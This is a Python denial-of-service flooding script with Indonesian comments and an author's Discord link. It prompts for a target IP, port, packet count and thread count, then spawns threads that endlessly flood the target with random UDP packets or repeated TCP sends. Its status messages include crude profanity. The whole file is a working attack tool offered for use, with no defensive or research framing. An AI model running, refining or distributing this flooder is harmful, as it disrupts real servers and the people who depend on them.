#!/usr/bin/env python3
#Semoga Tembus Ya Dek
#Ddos by Vinz505
#Join My T3Am : https://discord.gg/Du6kz6NCeX
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Vinz505")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? Pm Saya ")
ip = str(input(" DdosAttackByVinz505 | Ip:"))
port = int(input(" DdosAttackByVinz505 | Port:"))
choice = str(input(" DdosAttackByVinz505 | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByVinz505 | Packets:"))
threads = int(input(" DdosAttackByVinz505 | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | ATTACKING SERVER !!! |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" VINZ505 NIH BOSS!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
